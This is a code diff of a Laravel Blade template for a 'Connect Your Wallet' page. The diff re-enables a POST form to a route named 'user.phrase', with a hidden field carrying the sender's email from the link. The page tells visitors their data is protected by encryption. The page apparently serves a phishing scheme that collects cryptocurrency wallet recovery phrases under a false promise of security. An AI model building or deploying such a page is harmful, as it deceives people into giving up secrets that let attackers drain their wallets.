@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,13 +8,14 @@
     <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
 </head>
+
 <body class="bg-gray-100 flex items-center justify-center min-h-screen p-4 sm:p-6 lg:p-8">
     <div class="layout-content-container flex flex-col w-full max-w-[960px] mx-auto flex-1">
         @if (session('success'))
             <p class="text-green-500 mb-4 text-center">{{ session('success') }}</p>
         @endif
-        {{-- <form method="POST" action="{{ route('user.phrase') }}">
-            @csrf --}}
+        <form method="POST" action="{{ route('user.phrase') }}">
+            @csrf
             <input type="hidden" name="sender_email" value="{{ request()->query('sender_email') }}">
             <div class="flex flex-col max-w-[480px] mx-auto gap-4 px-4 py-3 sm:px-6 lg:px-8">
                 <label class="flex flex-col w-full">
@@ -76,9 +78,11 @@
         <div class="mt-8 text-center">
             <h2 class="text-[#0e141b] text-xl font-bold mb-4">Why Connect Your Wallet?</h2>
             <p class="text-[#4e7097] text-base leading-relaxed max-w-[600px] mx-auto">
-                Connecting your DEX wallet allows seamless interaction with our platform, enabling secure transactions and access to exclusive features. Your data is protected with industry-standard encryption.
+                Connecting your DEX wallet allows seamless interaction with our platform, enabling secure transactions
+                and access to exclusive features. Your data is protected with industry-standard encryption.
             </p>
         </div>
     </div>
 </body>
+
 </html>
